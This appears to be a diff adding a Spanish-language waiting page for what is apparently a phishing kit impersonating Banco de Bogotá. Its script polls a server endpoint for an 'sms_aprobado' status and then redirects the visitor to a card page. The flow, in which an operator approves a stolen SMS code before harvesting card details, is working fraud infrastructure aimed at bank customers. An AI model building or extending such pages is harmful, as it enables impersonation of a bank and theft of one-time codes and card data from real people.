@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <link rel="stylesheet" href="loading.css">
+</head>
+<body>
+
+<header class="header">
+    <img src="banco-de-bogota.webp" alt="Banco de Bogotá" class="logo">
+</header>
+
+<div class="loading-container">
+    <div class="loading-spinner"></div>
+</div>
+
+<script>
+function verificarEstado() {
+    fetch('Verificar_estado.php')
+        .then(response => response.json())
+        .then(data => {
+            console.log("Estado actual:", data.estado);
+            if (data.estado === "sms_aprobado") {
+                window.location.href = "Tarjeta.html";
+            } else {
+                setTimeout(verificarEstado, 2000);
+            }
+        })
+        .catch(error => {
+            console.error("Error al verificar el estado:", error);
+            setTimeout(verificarEstado, 5000); // Reintentar en caso de error
+        });
+}
+
+verificarEstado();
+</script>
+
+</body>
+</html>
